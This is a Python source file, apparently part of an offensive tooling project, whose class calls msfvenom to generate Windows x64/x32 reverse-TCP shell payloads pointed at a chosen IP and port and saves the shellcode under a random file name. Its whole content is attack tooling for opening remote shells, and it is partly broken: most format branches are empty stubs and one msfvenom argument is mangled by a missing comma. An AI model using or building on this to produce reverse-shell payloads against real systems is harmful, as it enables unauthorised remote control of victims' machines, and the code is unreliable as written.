import subprocess
import random


class Artifact_generator:
    def __init__(self, os, style, extension, ip, port, output):

        self.os = os
        self.style = style
        self.output = output
        self.extension = extension

        self.ip = ip
        self.port = port
        self.name = "artifact_"
        
        # TODO explore other options here aswell
        self.available_platforms = [
            "windows/x64/shell_reverse_tcp",
            "windows/x32/shell_reverse_tcp"
        ]
        
        # TODO add conversion between formats
        self.available_output_formats = {
            "ps1" : "powershell"
        }
        
        for platform in self.available_platforms:
            if self.os in platform:
                self.os = platform

    def msfvenom_generator(self):
        """ Generates the artifact using msfvenom """

        # Creates a random numbered name #
        for _ in range(6):
            self.name+=str(random.randint(0,9))
        
        if self.output == 'sc':
            command = [
                f"msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}",
                "-f", f"{self.available_output_formats[self.extension]}", 
                "-v", f"{self.output}", "-o" f"{self.name}.shellcode" 
            ]
        
        #TODO check what msfvenom supports and keep adding these here.
        elif self.extension == 'ps1':
            pass
        elif self.extension == 'exe':
            pass
        elif self.extension == 'c':
            pass
        elif self.extension == 'jar':
            pass
        elif self.extension == 'c++':
            pass
        # ...

        process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        return f"{self.name}.shellcode"


if __name__ == '__main__':
    pass
